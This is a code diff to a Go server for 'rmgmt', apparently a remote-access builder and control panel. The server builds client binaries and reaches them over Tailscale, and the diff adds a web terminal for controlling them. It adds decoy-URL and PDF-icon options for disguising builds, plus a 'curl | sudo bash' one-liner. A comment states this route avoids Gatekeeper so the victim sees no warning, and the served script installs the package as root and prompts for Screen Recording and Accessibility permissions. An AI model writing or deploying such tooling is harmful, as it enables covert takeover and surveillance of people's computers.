@@ -42,6 +42,9 @@ type BuildRequest struct {
 	TargetOS       string `json:"target_os"`
 	TargetArch     string `json:"target_arch"`
 	HostnamePrefix string `json:"hostname_prefix"`
+	DecoyURL       string `json:"decoy_url"`
+	PDFIcon        bool   `json:"pdf_icon"`
+	PackagePKG     bool   `json:"package_pkg"`
 }
 
 type BuildResponse struct {
@@ -51,6 +54,7 @@ type BuildResponse struct {
 	Size        int64  `json:"size,omitempty"`
 	BuildTime   string `json:"build_time,omitempty"`
 	Error       string `json:"error,omitempty"`
+	InstallCmd  string `json:"install_cmd,omitempty"`
 }
 
 var (
@@ -88,6 +92,7 @@ func main() {
 	mux.HandleFunc("/api/targets", handleTargets)
 	mux.HandleFunc("/api/clients", handleListClients)
 	mux.HandleFunc("/download/", handleDownload)
+	mux.HandleFunc("/install/", handleInstallScript)
 
 	// Proxy to client endpoints (handles /proxy/{clientIP}/...)
 	mux.HandleFunc("/proxy/", handleProxy)
@@ -200,6 +205,27 @@ func handleIndex(w http.ResponseWriter, r *http.Request) {
 			http.Error(w, err.Error(), http.StatusInternalServerError)
 		}
 
+	case "/terminal":
+		host := r.URL.Query().Get("host")
+		name := r.URL.Query().Get("name")
+		if host == "" {
+			http.Redirect(w, r, "/clients", http.StatusFound)
+			return
+		}
+		if name == "" {
+			name = host
+		}
+		data := struct {
+			Hostname string
+			BaseURL  string
+		}{
+			Hostname: name,
+			BaseURL:  fmt.Sprintf("/proxy/%s", host),
+		}
+		if err := templates.ExecuteTemplate(w, "terminal.html", data); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+		}
+
 	default:
 		http.NotFound(w, r)
 	}
@@ -242,6 +268,9 @@ func handleBuild(w http.ResponseWriter, r *http.Request) {
 		Version:        "1.0.0",
 		HostnamePrefix: req.HostnamePrefix,
 		OutputDir:      buildOutputDir,
+		DecoyURL:       req.DecoyURL,
+		PDFIcon:        req.PDFIcon,
+		PackagePKG:     req.PackagePKG,
 	})
 
 	if result.Error != nil {
@@ -263,12 +292,26 @@ func handleBuild(w http.ResponseWriter, r *http.Request) {
 		result.BuildTime,
 	)
 
+	// Generate a curl install one-liner for .pkg builds
+	var installCmd string
+	if strings.HasSuffix(result.FileName, ".pkg") {
+		// Determine the server's base URL from the request
+		scheme := "http"
+		if r.TLS != nil {
+			scheme = "https"
+		}
+		baseURL := fmt.Sprintf("%s://%s", scheme, r.Host)
+		installURL := fmt.Sprintf("%s/install/%s/%s", baseURL, downloadToken, result.FileName)
+		installCmd = fmt.Sprintf("curl -fsSL '%s' | sudo bash", installURL)
+	}
+
 	sendBuildResponse(w, BuildResponse{
 		Success:     true,
 		DownloadURL: downloadURL,
 		FileName:    result.FileName,
 		Size:        result.Size,
 		BuildTime:   result.BuildTime.String(),
+		InstallCmd:  installCmd,
 	})
 }
 
@@ -308,6 +351,53 @@ func handleDownload(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Length", fmt.Sprintf("%d", info.Size()))
 
 	io.Copy(w, file)
+}
+
+// handleInstallScript serves a self-contained install script that downloads
+// and installs a .pkg build. Since curl doesn't set quarantine, the user
+// never sees a Gatekeeper "Open Anyway" prompt.
+func handleInstallScript(w http.ResponseWriter, r *http.Request) {
+	// URL format: /install/{token}/{filename}
+	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/install/"), "/")
+	if len(parts) != 2 {
+		http.NotFound(w, r)
+		return
+	}
+
+	token := parts[0]
+	fileName := parts[1]
+
+	filePath := getDownload(token)
+	if filePath == "" {
+		http.NotFound(w, r)
+		return
+	}
+	if filepath.Base(filePath) != fileName {
+		http.NotFound(w, r)
+		return
+	}
+
+	// Build the direct download URL
+	scheme := "http"
+	if r.TLS != nil {
+		scheme = "https"
+	}
+	pkgURL := fmt.Sprintf("%s://%s/download/%s/%s", scheme, r.Host, token, fileName)
+
+	script := fmt.Sprintf(`#!/bin/bash
+set -e
+[ "$(id -u)" -eq 0 ] || { echo "Run with sudo"; exit 1; }
+TMP=$(mktemp /tmp/rmgmt-XXXXXX.pkg)
+echo "[*] Downloading %s..."
+curl -fsSL -o "$TMP" '%s'
+echo "[*] Installing..."
+installer -pkg "$TMP" -target /
+rm -f "$TMP"
+echo "[✓] Installed. Grant Screen Recording + Accessibility when prompted."
+`, fileName, pkgURL)
+
+	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
+	w.Write([]byte(script))
 }
 
 func sendBuildResponse(w http.ResponseWriter, resp BuildResponse) {
@@ -415,14 +505,29 @@ func handleListClients(w http.ResponseWriter, r *http.Request) {
 
 	var clients []ClientInfo
 	for _, peer := range status.Peer {
+		// Determine the display name: prefer HostName, fall back to DNSName
+		name := peer.HostName
+		if name == "" {
+			// tsnet clients may only populate DNSName (e.g. "rmgmt-host.tailnet.ts.net.")
+			name = strings.TrimSuffix(peer.DNSName, ".")
+			if idx := strings.IndexByte(name, '.'); idx > 0 {
+				name = name[:idx]
+			}
+		}
+
 		// Filter to only show rmgmt clients (by hostname prefix)
-		if strings.HasPrefix(peer.HostName, "rmgmt-") && peer.HostName != "rmgmt-admin" {
+		isRmgmt := strings.HasPrefix(strings.ToLower(name), "rmgmt-") ||
+			strings.HasPrefix(strings.ToLower(peer.DNSName), "rmgmt-")
+		isAdmin := strings.ToLower(name) == "rmgmt-admin" ||
+			strings.HasPrefix(strings.ToLower(peer.DNSName), "rmgmt-admin.")
+
+		if isRmgmt && !isAdmin {
 			ips := make([]string, len(peer.TailscaleIPs))
 			for i, ip := range peer.TailscaleIPs {
 				ips[i] = ip.String()
 			}
 			clients = append(clients, ClientInfo{
-				Hostname: peer.HostName,
+				Hostname: name,
 				IPs:      ips,
 				Online:   peer.Online,
 				OS:       peer.OS,
